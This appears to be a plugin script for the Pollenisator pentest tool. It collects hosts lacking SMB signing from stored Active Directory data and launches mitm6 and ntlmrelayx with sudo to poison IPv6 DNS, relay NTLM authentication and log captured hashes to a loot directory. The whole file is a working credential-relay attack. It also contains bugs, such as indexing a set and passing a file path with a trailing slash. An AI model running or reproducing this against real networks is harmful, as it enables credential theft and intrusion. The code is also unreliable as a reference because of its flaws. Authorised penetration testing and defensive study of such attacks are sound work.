import pollenisatorgui.core.components.utils as utils
from pollenisatorgui.core.application.dialogs.ChildDialogQuestion import ChildDialogQuestion
from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
from pollenisatorgui.core.application.dialogs.ChildDialogAskText import ChildDialogAskText
import os
from pollenisatorgui.core.components.apiclient import APIClient
import psutil


def main(apiclient, **kwargs):
    APIClient.setInstance(apiclient)
    smb_signing_list = apiclient.find("ActiveDirectory", {"infos.signing":"False"}, True)
    export_dir = utils.getExportDir()
    file_name = os.path.join(export_dir, "relay_list.lst")
    domains = set()
    liste = []
    with open(file_name, "w") as f:
        for computer in smb_signing_list:
            ip = computer.get("ip", "")
            domain=computer.get("domain", "")
            if domain.strip() != "":
                domains.add(domain)

            if ip != "":
                liste.append(ip)
                f.write(ip+"\n")
    if len(liste) == 0:
        return False, "No relayable host found yet"
    # 
    relaying_loot_path = os.path.join(export_dir, "loot_relay")
    try:
        os.makedirs(relaying_loot_path)
    except:
        pass
    relaying_loot_path = os.path.join(relaying_loot_path, "hashes-mitm6.log")
    addrs = psutil.net_if_addrs()
    dialog = ChildDialogCombo(None, addrs.keys(), displayMsg="Choose your ethernet device to listen on")
    dialog.app.wait_window(dialog.app)
    device = dialog.rvalue
    if device is None:
        return False, "No device selected"
    domain = ""
    if len(domains) == 0:
        dialog = ChildDialogAskText(None, "Enter domain name", multiline=False)
        dialog.app.wait_window(dialog.app)
        domain = dialog.rvalue
    elif len(domains) == 1:
        domain = domains[0]
    else:
        dialog = ChildDialogCombo(None, domains, displayMsg="Choose target domain")
        dialog.app.wait_window(dialog.app)
        domain = dialog.rvalue
    if domain is None:
        return False, "No domain choosen"

    address = addrs[device][0].address
    cmd = f"ntlmrelayx -tf {file_name} -6 -wh {address} -of {relaying_loot_path}/"
    if os.geteuid() != 0:
        cmd = "sudo "+cmd
    utils.executeInExternalTerm(f"'{cmd}'", default_target=kwargs.get("default_target", None))
    cmd = f"mitm6 -i {device} -d {domain}"
    if os.geteuid() != 0:
        cmd = "sudo "+cmd
    utils.executeInExternalTerm(f"'{cmd}'", default_target=kwargs.get("default_target", None))
    return True, f"Listening ntlmrelayx with mittm6 opened, loot directory is here:"+str(relaying_loot_path)+"\n"
    
